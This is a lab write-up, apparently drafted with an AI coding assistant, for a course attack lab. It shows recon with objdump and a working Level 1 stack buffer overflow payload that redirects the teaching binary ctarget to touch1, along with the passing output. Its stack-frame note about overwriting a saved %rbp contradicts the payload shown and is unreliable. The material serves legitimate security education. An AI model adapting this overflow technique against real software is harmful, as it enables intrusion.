# Lab 3: Attack Lab

This lab explores classic stack buffer overflows and return-oriented programming (ROP) using the provided Linux x86-64 targets.

---

## Environment Setup

- Same approach as Lab 2 ([lab2/README.md](cci:7://file:///Users/olegleyzerov/CascadeProjects/cmu-15213-labs/lab2/README.md:0:0-0:0)): run a Linux x86-64 userland via Docker on Apple Silicon and mount the working directory.
- Example:
```bash
docker run --rm -it --platform linux/amd64 -v .:/work ubuntu:20.04 bash
apt-get update
apt-get install -y binutils gdb make python3
```

---

## Tools

- `objdump -d <bin>` for disassembly
- `objdump -s -j .rodata <bin>` to inspect constants
- `gdb` for dynamic inspection
- `hex2raw` to convert hex-encoded payloads to raw input

---

## Level 1 (ctarget): Call touch1 via Stack Buffer Overflow

### Vulnerability recap
Buffer overflows arise when reading user input into a fixed-size stack buffer without length validation. By overflowing the buffer, we can overwrite the saved return address and redirect control flow.

### Recon
1. Disassemble the target:
```bash
objdump -d ctarget > ctarget.d
```

2. Find `getbuf` stack allocation (40 bytes):
```
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28      subq $0x28, %rsp    ; 0x28 = 40 bytes
```

3. Find `touch1` entry address:
```
00000000004017c0 <touch1>:
  4017c0: 48 83 ec 08      subq $0x8, %rsp
```

### Plan
- Fill 40 bytes to occupy the local buffer in `getbuf`.
- Overwrite the saved return address with the little-endian address of `touch1` (`0x4017c0` → bytes `C0 17 40 00 00 00 00 00` on x86-64).
- Feed the raw payload to `ctarget`.

### Payload (hex)
- 40 bytes of filler, then the 8-byte return address:
```
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
C0 17 40 00 00 00 00 00
```

### Execution
```bash
# Convert hex to raw and pipe to the target
./hex2raw < ctarget.11.txt | ./ctarget -q
```

Output:
```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id  bovik
  course   15213-f15
  lab      attacklab
  result   1:PASS:0xffffffff:ctarget:1:50 51 ... C0 17 40 00 00 00 00 00
```

### Notes
- Stack frame math: 40 bytes for buffer → overwrite saved `%rbp` and then return address.
- Little-endian means the lowest-order byte of the address comes first in memory.

---

## Next Steps

There are four more assignments focusing on:
- Crafting returns to other `touch*` routines (with argument setup)
- Chaining gadgets for ROP to bypass limited direct injections
- Understanding calling conventions and stack discipline under attack scenarios

I’ll proceed to:
1) Document Level 2 (calling `touch2` with correct data).  
2) Document Level 3 (`touch3` with the cookie).  
3) ROP levels for `rtarget` (control flow with gadgets).  
4) Add tips for using `gdb` (`disas`, `x/gx`, `info frame`, `ni/si`) and notes on ASLR/canaries if relevant to the target build.
